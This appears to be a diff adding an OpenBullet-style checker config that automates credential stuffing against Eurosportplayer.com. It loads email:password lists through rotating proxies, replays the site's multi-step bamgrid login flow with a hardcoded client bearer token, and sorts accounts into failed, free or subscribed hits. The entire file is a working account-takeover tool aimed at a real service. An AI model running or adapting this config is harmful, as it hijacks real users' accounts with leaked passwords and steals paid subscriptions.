@@ -1,0 +1,158 @@
+[SETTINGS]
+{
+  "Name": "Eurosportplayer.com",
+  "SuggestedBots": 16,
+  "LastModified": "2018-12-08T20:57:13.901692+00:00",
+  "AdditionalInfo": "",
+  "Author": "Perce",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#SITE REQUEST GET "https://es.eurosportplayer.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+#CHECK_BAN KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "Eurosport Player</title>" 
+#DEVICES REQUEST POST "https://eu.edge.bamgrid.com/devices" AutoRedirect=TRUE 
+  CONTENT "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"firefox\",\"deviceProfile\":\"windows\",\"attributes\":{}}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer 4K0redryzbpsShVgneLaVp9AMh0b0sguXS4CtSuG9dC4vSeo9kzyjCW3mV7jfqPd" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"grant_type\":\"" 
+#TOKEN PARSE "<SOURCE>" LR "\"assertion\":\"" "\"" Recursive=FALSE -> VAR "TOK" "" "" 
+#LOGIN_TOKEN REQUEST POST "https://eu.edge.bamgrid.com/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=<TOK>&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer 4K0redryzbpsShVgneLaVp9AMh0b0sguXS4CtSuG9dC4vSeo9kzyjCW3mV7jfqPd" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+#BEARER2 PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" Recursive=FALSE -> VAR "TOK2" "" "" 
+#LOGIN REQUEST POST "https://eu.edge.bamgrid.com/idp/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer <TOK2>" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK3 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "\"description\":\"Bad credentials sent for eurosport/" 
+  KEYCHAIN Success OR 
+    KEY "{\"token_type\":\"Bearer\",\"id_token\":\"" 
+#BEARER3 PARSE "<SOURCE>" LR "id_token\":\"" "\"" Recursive=FALSE -> VAR "TOK3" "" "" 
+#GRANT REQUEST POST "https://eu.edge.bamgrid.com/accounts/grant" AutoRedirect=TRUE 
+  CONTENT "{\"id_token\":\"<TOK3>\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer <TOK2>" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK4 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:jwt-bearer" 
+  KEYCHAIN Ban OR 
+    KEY "description\":\"Invalid serialized unsecured" 
+#BEARER4 PARSE "<SOURCE>" LR "\"assertion\":\"" "\"" Recursive=FALSE -> VAR "TOK4" "" "" 
+#LOGIN_TOKEN2 REQUEST POST "https://eu.edge.bamgrid.com/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=<TOK4>&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer 4K0redryzbpsShVgneLaVp9AMh0b0sguXS4CtSuG9dC4vSeo9kzyjCW3mV7jfqPd" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK5 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+#BEARER5 PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" Recursive=FALSE -> VAR "TOK5" "" "" 
+#ACCOUNT REQUEST GET "https://eu.edge.bamgrid.com/accounts/me" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://es.eurosportplayer.com/login" 
+  HEADER "authorization: Bearer <TOK5>" 
+  HEADER "x-bamsdk-version: 3.3" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://es.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK6 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"accountId\":\"" 
+#ID PARSE "<SOURCE>" LR "{\"accountId\":\"" "\"" Recursive=FALSE -> VAR "ID" "" "" 
+#SUSBCRIPTION REQUEST GET "https://eu.edge.bamgrid.com/ws/subscription/v1/details?view=DETAILED&filter.id=<ID>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://secure.web.eurosportplayer.com/" 
+  HEADER "Authorization: <TOK5>" 
+  HEADER "Origin: https://secure.web.eurosportplayer.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+#KEY_CHECK7 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" EqualTo "{\"subscriptions\":[]}" 
+  KEYCHAIN Success AND 
+    KEY "{\"subscriptions\":[" 
+    KEY "<SOURCE>" DoesNotContain "{\"subscriptions\":[]}" 
